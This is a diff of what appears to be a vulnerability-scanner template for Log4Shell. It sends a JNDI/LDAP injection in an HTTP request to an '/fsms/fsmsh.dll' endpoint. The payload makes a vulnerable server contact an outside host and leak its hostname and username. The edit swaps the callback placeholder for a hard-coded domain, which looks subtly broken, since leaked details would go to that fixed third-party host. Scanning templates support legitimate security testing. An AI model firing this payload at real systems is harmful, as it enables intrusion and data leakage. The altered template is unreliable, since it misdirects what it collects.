@@ -26,7 +26,7 @@ variables:
 http:
   - raw:
       - |
-        GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
+        GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}} HTTP/1.1
         Host: {{Hostname}}
         Referrer: {{RootURL}}
 
